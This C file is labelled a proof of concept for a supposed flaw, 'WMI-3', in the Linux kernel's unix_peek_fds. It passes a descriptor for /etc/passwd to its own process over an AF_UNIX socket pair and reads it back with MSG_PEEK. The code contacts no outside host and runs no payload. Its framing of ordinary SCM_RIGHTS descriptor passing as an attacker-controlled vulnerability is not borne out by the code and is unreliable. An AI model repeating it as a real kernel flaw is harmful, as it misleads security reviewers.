/*
 * PoC for WMI-3: unix_peek_fds
 * 
 * This demonstrates that unix_peek_fds copies attacker-determined
 * (untrusted) file descriptors into an authoritative position
 * (scm_cookie.fp).
 *
 * Steps:
 * 1. Create AF_UNIX SOCK_DGRAM socket pair
 * 2. Send a message with SCM_RIGHTS ancillary data
 * 3. recvmsg with MSG_PEEK to trigger unix_peek_fds
 * 
 * The function unix_peek_fds at af_unix.c:1777 does:
 *   scm->fp = scm_fp_dup(UNIXCB(skb).fp);
 * 
 * This copies file descriptors from the sender (attacker) into
 * the receiver's authoritative scm_cookie without validation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(void)
{
    int sv[2];
    int fd;
    struct msghdr msg = {0};
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    /* Send SCM_RIGHTS */
    memset(buf, 0x41, sizeof(buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);

    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    msg.msg_flags = 0;

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd;

    ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        return 1;
    }
    printf("Sent SCM_RIGHTS\n");

    /* MSG_PEEK recvmsg triggers unix_peek_fds */
    memset(&msg, 0, sizeof(msg));
    memset(cmsg_buf, 0, sizeof(cmsg_buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    ret = recvmsg(sv[1], &msg, MSG_PEEK);
    if (ret < 0) {
        perror("recvmsg PEEK");
        return 1;
    }
    printf("Peek succeeded\n");

    /* Consume the message (non-peek) */
    memset(&msg, 0, sizeof(msg));
    memset(cmsg_buf, 0, sizeof(cmsg_buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    ret = recvmsg(sv[1], &msg, 0);
    if (ret < 0) {
        perror("recvmsg");
        return 1;
    }
    printf("Consumed message\n");

    close(fd);
    close(sv[0]);
    close(sv[1]);
    return 0;
}
